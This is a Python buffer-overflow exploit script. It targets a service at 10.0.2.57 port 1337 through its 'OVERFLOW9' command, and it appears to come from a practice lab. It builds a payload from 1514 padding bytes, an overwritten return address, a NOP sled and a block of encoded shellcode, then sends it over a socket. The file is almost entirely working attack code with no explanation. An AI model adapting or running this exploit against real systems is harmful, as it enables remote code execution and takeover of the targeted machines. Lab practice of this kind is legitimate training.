import socket, sys, time


ip = '10.0.2.57'	# Change this
port = 1337		# Change this

buffer = b'OVERFLOW9 '
buffer += b'A' * 1514
retn = b'\xaf\x11\x50\x62'
padding = b'\x90' * 16
shellcode =  b""
shellcode += b"\xbf\xa5\x4d\x70\xb8\xdd\xc3\xd9\x74\x24\xf4"
shellcode += b"\x5a\x31\xc9\xb1\x31\x83\xea\xfc\x31\x7a\x0f"
shellcode += b"\x03\x7a\xaa\xaf\x85\x44\x5c\xad\x66\xb5\x9c"
shellcode += b"\xd2\xef\x50\xad\xd2\x94\x11\x9d\xe2\xdf\x74"
shellcode += b"\x11\x88\xb2\x6c\xa2\xfc\x1a\x82\x03\x4a\x7d"
shellcode += b"\xad\x94\xe7\xbd\xac\x16\xfa\x91\x0e\x27\x35"
shellcode += b"\xe4\x4f\x60\x28\x05\x1d\x39\x26\xb8\xb2\x4e"
shellcode += b"\x72\x01\x38\x1c\x92\x01\xdd\xd4\x95\x20\x70"
shellcode += b"\x6f\xcc\xe2\x72\xbc\x64\xab\x6c\xa1\x41\x65"
shellcode += b"\x06\x11\x3d\x74\xce\x68\xbe\xdb\x2f\x45\x4d"
shellcode += b"\x25\x77\x61\xae\x50\x81\x92\x53\x63\x56\xe9"
shellcode += b"\x8f\xe6\x4d\x49\x5b\x50\xaa\x68\x88\x07\x39"
shellcode += b"\x66\x65\x43\x65\x6a\x78\x80\x1d\x96\xf1\x27"
shellcode += b"\xf2\x1f\x41\x0c\xd6\x44\x11\x2d\x4f\x20\xf4"
shellcode += b"\x52\x8f\x8b\xa9\xf6\xdb\x21\xbd\x8a\x81\x2f"
shellcode += b"\x40\x18\xbc\x1d\x42\x22\xbf\x31\x2b\x13\x34"
shellcode += b"\xde\x2c\xac\x9f\x9b\xd3\x4e\x0a\xd1\x7b\xd7"
shellcode += b"\xdf\x58\xe6\xe8\x35\x9e\x1f\x6b\xbc\x5e\xe4"
shellcode += b"\x73\xb5\x5b\xa0\x33\x25\x11\xb9\xd1\x49\x86"
shellcode += b"\xba\xf3\x29\x49\x29\x9f\x83\xec\xc9\x3a\xdc"






payload = buffer + retn + padding + shellcode

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, port))
        #s.recv(1024)
        print('Sending payload')
        s.send(payload)
        s.recv(1024)
except Exception as e:
    print(e)
    sys.exit(0)